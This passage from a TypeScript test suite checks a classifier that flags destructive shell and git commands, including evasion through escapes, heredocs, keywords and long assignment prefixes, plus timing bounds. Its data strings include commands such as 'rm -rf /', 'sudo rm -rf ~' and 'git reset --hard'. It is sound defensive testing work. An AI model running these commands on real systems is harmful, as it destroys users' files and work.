    expect(classOf("rm -rf $pwd/build", SESSION)).toBe("catastrophic");
    expect(classOf('rm -rf "$(pwd)$(echo /x)"', SESSION)).toBe("catastrophic");
    expect(classOf("rm -rf $(echo $PWD)/build", SESSION)).toBe("catastrophic");
    expect(classOf("rm -rf `echo ~`/build", SESSION)).toBe("catastrophic");
  });

  test("a single-quoted mention of the working directory in a command is not a removal", () => {
    none("echo 'rm -rf $PWD'");
    none('echo "rm -rf $PWD"');
    none("echo \"$(pwd)\" 'rm -rf $(pwd)'");
  });
});

describe("the command prefix scan stays linear", () => {
  const fastest = (command: string, ctx?: Context): number => {
    const times = [0, 1, 2].map(() => {
      const start = performance.now();
      classify(command, ctx);
      return performance.now() - start;
    });
    return Math.min(...times);
  };

  test.each([
    ["spaces", "A=b ".repeat(500) + "rm -rf build"],
    ["tabs", "A=b\t".repeat(500) + "rm -rf build"],
    ["newlines", "A=b\n".repeat(500) + "rm -rf build"],
    ["quoted values", 'A="b c" '.repeat(500) + "rm -rf build"],
    ["substitutions", "A=$(x) ".repeat(500) + "rm -rf build"],
    ["parentheses", "A=(b=c ".repeat(500) + "rm -rf build"],
    ["before git", "A=b ".repeat(500) + "git status"],
    ["a run of white space", `;${" ".repeat(4000)}git status`],
  ])("a command behind 500 assignments (%s) classifies in under 50 ms", (_, command) => {
    expect(fastest(command)).toBeLessThan(50);
  });

  test("the assignments are still skipped, on one line or on several", () => {
    removal(`${"A=b ".repeat(500)}rm -rf build`, "build");
    removal(`${"A=b\n".repeat(500)}rm -rf build`, "build");
    git(`${"A=b ".repeat(500)}git reset --hard`, "reset --hard");
    catastrophic(`${"A=b ".repeat(500)}sudo rm -rf ~`);
    catastrophic("FOO=1\nrm -rf /");
    catastrophic("sudo A=b rm -rf /");
    catastrophic("A=$(rm -rf ~) true");
    catastrophic('A="$(echo hi)" rm -rf ~');
    none(`${"A=b ".repeat(500)}echo rm -rf build`);
  });
});

describe("a backslash escape", () => {
  test("a continued command reads as one line", () => {
    removal("rm -rf \\\n  ./build \\\n  ./dist", "./build", "./dist");
    removal("rm -rf \\\n  build", "build");
    catastrophic("rm -rf \\\n/");
    catastrophic("rm -rf \\\n  ~/");
  });

  test("an escaped quote does not close a double-quoted span", () => {
    none('echo "see \\"a; rm -rf /\\" docs"');
    none('git commit -m "guard: block \\"cd /; rm -rf ~\\" too"');
    none('git commit -m "note: \\"foo && git reset --hard\\" is bad"');
    catastrophic('echo "a"; rm -rf /');
    catastrophic('echo "a \\" b"; rm -rf /');
  });

  test("an escaped separator or parenthesis is an argument, not a command position", () => {
    none("echo \\; rm -rf /");
    none("echo x \\; rm -rf /");
    none("echo \\( rm -rf / \\)");
    none("echo \\| git reset --hard");
    catastrophic("echo \\\\; rm -rf /");
    catastrophic("echo \\; ; rm -rf /");
  });

  test("an escaped space stays one argument", () => {
    removal("rm -rf my\\ build", "my build");
    removal("rm -rf ./x\\ y", "./x y");
  });

  test("the scan keeps the length of the command", () => {
    for (const command of ["rm -rf \\\n./a", "echo \\; rm", 'echo "\\"; rm"', "x \\\\; y"]) {
      expect(neutralizeQuotedPositions(command)).toHaveLength(command.length);
    }
    expect(neutralizeQuotedPositions("echo \\; rm")).toBe("echo \\_ rm");
    expect(neutralizeQuotedPositions("rm \\\n-rf")).toBe("rm   -rf");
  });

  test("shellWords reads a backslash-newline as nothing", () => {
    expect(shellWords("-rf \\\n  ./a \\\n  ./b")).toEqual(["-rf", "./a", "./b"]);
    expect(shellWords("a\\\nb")).toEqual(["ab"]);
  });
});

describe("the command position", () => {
  test.each([
    "{ rm -rf /; }",
    "x; { sudo -E rm -rf ~; }",
    "if true; then rm -rf /; fi",
    "if true\nthen\n  rm -rf /\nfi",
    "for d in a; do rm -rf /; done",
    "if false; then :; else rm -rf /; fi",
    "if false; then :; elif true; then rm -rf /; fi",
    "while rm -rf /; do :; done",
    "until rm -rf /; do :; done",
    "! rm -rf /",
    "sudo -E rm -rf /",
    "sudo -n rm -rf /",
    "sudo -u root rm -rf /",
    "sudo -u root -E rm -rf /",
    "sudo --preserve-env rm -rf /",
    "sudo -- rm -rf /",
    "env -i rm -rf /",
    "env -u X rm -rf /",
    "exec rm -rf /",
    "time rm -rf /",
    "nohup rm -rf /",
    "nice rm -rf /",
  ])("a catastrophic removal behind %j is caught", (command) => {
    catastrophic(command);
  });

  test("a git operation behind a keyword or brace group is caught", () => {
    git("if true; then git reset --hard; fi", "reset --hard");
    git("{ git stash; }", "stash");
    git("sudo -E git clean -fd", "clean");
  });

  test.each([
    "echo rm -rf then",
    "echo time rm -rf /",
    "echo then rm -rf /",
    "echo { rm -rf / }",
    "echo {rm -rf /}",
    'git commit -m "fix { rm -rf / } handling"',
    "echo '{ rm -rf / }'",
    "echo ! rm -rf /",
    "docker rm -rf /",
    "echo sudo -E rm -rf /",
  ])("a mention of a removal in %j is not one", (command) => {
    none(command);
  });
});

describe("the recursive flag group stays linear", () => {
  const fastest = (command: string): number =>
    Math.min(
      ...[0, 1, 2].map(() => {
        const at = performance.now();
        classify(command);
        return performance.now() - at;
      }),
    );

  // 100k letters take the linear scan a few milliseconds and a quadratic one several seconds on this
  // laptop, so a bound of a second holds on any runner and still fails the quadratic scan.
  test("a long run of one flag letter classifies in under a second", () => {
    expect(fastest(`rm -${"r".repeat(100_000)};`)).toBeLessThan(1_000);
  }, 60_000);

  // A repeated flag or keyword costs about 2 µs a repetition, which a slow runner triples, so the
  // bound is a ratio measured in the same run: four times the input takes about four times as long
  // when the scan is linear and sixteen times as long when it is quadratic.
  test.each([
    ["sudo flags", (count: number) => `sudo ${"-E ".repeat(count)}ls`],
    ["leading keywords", (count: number) => `; ${"then ".repeat(count)}ls`],
  ])("%s: four times the input takes under ten times as long", (_, command) => {
    expect(fastest(command(80_000)) / fastest(command(20_000))).toBeLessThan(10);
  }, 60_000);

  test("a flag group that holds r is still recursive, in any position and case", () => {
    catastrophic("rm -r /");
    catastrophic("rm -fr /");
    catastrophic("rm -rf /");
    catastrophic("rm -Rf /");
    catastrophic("rm -vrf /");
    catastrophic("rm --recursive /");
    catastrophic("rm -f -r /");
    none("rm -f /");
    none("rm -v /");
  });
});

describe("an unquoted heredoc body", () => {
  test("is text, so a script or note it writes is not run", () => {
    none("cat > clean.sh <<EOF\n#!/bin/sh\nrm -rf /tmp/*\nEOF");
    none('cat > clean.sh <<EOF\nrm -rf "$BUILD_DIR"/*\nEOF');
    none("cat > notes.md <<EOF\nrun git reset --hard first; then rm -rf ~\nEOF");
    none("cat <<-EOF\n\trm -rf /\n\tEOF");
    none("cat <<EOF\nrm -rf /");
    none("cat <<EOF\n\\$(rm -rf ~)\nEOF");
  });

  test("still runs a substitution it holds", () => {
    catastrophic("cat <<EOF\n$(rm -rf ~)\nEOF");
    catastrophic("cat <<EOF\n`rm -rf ~`\nEOF");
    catastrophic("cat <<EOF\nx $(echo; rm -rf ~) y\nEOF");
    catastrophic("cat <<EOF\n$(\nrm -rf ~\n)\nEOF");
    git("cat <<EOF\n$(git stash)\nEOF", "stash");
  });

  test("is text again after a closed substitution", () => {
    none("cat <<EOF\n$(echo hi) then rm -rf /\nEOF");
    none("cat <<EOF\n`echo hi`; rm -rf /\nEOF");
  });

  test("ends at its terminator, after which a command runs", () => {
    catastrophic("cat <<EOF\nnotes\nEOF\nrm -rf /");
    catastrophic("rm -rf / <<EOF\nnotes\nEOF");
    catastrophic("cat <<-EOF\n\tnotes\n\tEOF\nrm -rf /");
  });

  test("keeps the length of the command", () => {
    const command = "cat <<EOF\nrm -rf /; x $(y; z) w\nEOF\nls";
    expect(neutralizeQuotedPositions(command)).toBe("cat <<EOF\n____________$(y; z)__\nEOF\nls");
  });
});

describe("git operations that read or only name a path", () => {
  test("a stash listing or inspection is not a stash", () => {
    none("git stash list");
    none("git stash show -p");
    none("git stash show");
    git("git stash", "stash");
    git("git stash pop", "stash");
    git("git stash push -m list", "stash");
    git("git stash\nshow", "stash");
  });

  test("a clean dry run is not a clean", () => {
    none("git clean -n");
    none("git clean -fdn");
    none("git clean -fd --dry-run");
    none("git clean --dry-run -fd");
    git("git clean -fd", "clean");
    git("git clean -fdx", "clean");
    git("git clean -fd\nls -n", "clean");
    git("git clean -fd; ls -n", "clean");
  });

  test("a checkout of `.` restores the tree, and a checkout of a name does not", () => {
    git("git checkout .", "checkout --");
    git("git checkout HEAD .", "checkout --");
    git("git checkout ./src", "checkout --");
    git("git checkout main -- .", "checkout --");
    none("git checkout main");
    none("git checkout .github");
    none("git checkout -b x");
    none("git checkout main\ncp -r build .");
  });

  test("a recursive git rm is caught whatever order its flags come in", () => {
    git("git rm -r --cached x", "rm -r");
    git("git rm --cached -r x", "rm -r");
    git("git rm -f -r x", "rm -r");
    none("git rm --cached x");
    none("git rm x");
  });
});
